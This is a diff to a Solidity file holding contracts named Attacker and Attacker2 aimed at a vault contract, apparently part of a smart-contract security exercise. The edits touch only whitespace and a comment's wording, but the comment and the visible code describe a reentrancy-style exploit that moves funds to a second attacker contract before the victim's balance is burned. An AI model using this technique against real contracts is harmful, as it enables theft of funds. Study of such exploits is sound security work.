@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.20;
+
 import "./vault.sol";
 
 contract Attacker {
@@ -25,9 +26,8 @@ contract Attacker {
         }
     }
 
-
     /**
-     * @notice Receive ether. same amout of withdraw() but we can transfer same amount to attacker2. 
+     * @notice Receive ether. the same amount of withdraw() but we can transfer the same amount to attacker2. 
      * Because burn balance of attacker1 after this function.
      * @dev triggered by victim.withdraw()
      */
@@ -35,6 +35,7 @@ contract Attacker {
         victim.transfer(address(attacker2), msg.value);
     }
 }
+
 
 contract Attacker2 {
 
@@ -50,5 +51,3 @@ contract Attacker2 {
     }
 
 }
-
-
